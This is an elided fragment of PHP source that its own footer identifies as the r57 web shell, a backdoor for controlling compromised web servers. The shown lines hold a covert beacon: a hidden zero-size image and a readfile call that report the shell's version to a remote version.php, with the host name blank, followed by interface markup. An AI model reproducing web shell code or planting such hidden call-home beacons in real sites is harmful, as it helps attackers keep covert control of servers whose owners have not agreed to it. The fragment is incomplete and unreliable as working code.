...
@print "<img src=\"/version.php?img=1&version=".$current_version."\" border=0 height=0 width=0>";
@readfile ("http:///version.php?version=".$current_version."");}}
...
echo '</table>'.$table_up3."</div></div><div align=center id='n'><font face=Verdana size=-2><b>o---[  v1.3- Thesaboarqe : R57<a href=http://www./>www.r57/</a> | version ".$version." ]---o</b></font></div></td></tr></table>".$f;
?>
